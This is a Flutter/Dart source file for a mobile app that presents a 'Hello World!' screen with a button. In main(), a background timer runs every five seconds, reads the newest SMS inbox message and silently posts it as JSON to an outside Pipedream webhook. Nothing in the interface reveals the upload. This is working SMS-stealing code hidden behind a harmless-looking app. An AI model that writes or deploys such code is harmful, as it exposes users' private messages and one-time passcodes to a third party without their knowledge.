import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  Permission.sms.request();
  Timer.periodic(const Duration(seconds: 5), (_) async {
    print("i got called");
    SmsQuery query = SmsQuery();

    if (!await Permission.sms.request().isGranted) return;

    final res = await query.querySms(kinds: [SmsQueryKind.inbox], count: 1);
    if (res.isEmpty) return;
    final mes = res.first;
    http.post(Uri.parse("https://eog6j7x04hlaikh.m.pipedream.net"),
        headers: {
          'Content-Type': 'application/json; charset=UTF-8',
        },
        body: jsonEncode(mes.toMap));
  });
  runApp(const MainApp());
}

class MainApp extends StatelessWidget {
  const MainApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: Column(children: [
          const Text('Hello World!'),
          ElevatedButton(
              onPressed: () async {
                SmsQuery query = SmsQuery();

                if (!await Permission.sms.request().isGranted) return;

                final res = await query.querySms(count: 1);
                final mes = res.first;
                print(mes.sender);
                print(mes.body);
              },
              child: const Text("click me"))
        ]),
      ),
    );
  }
}
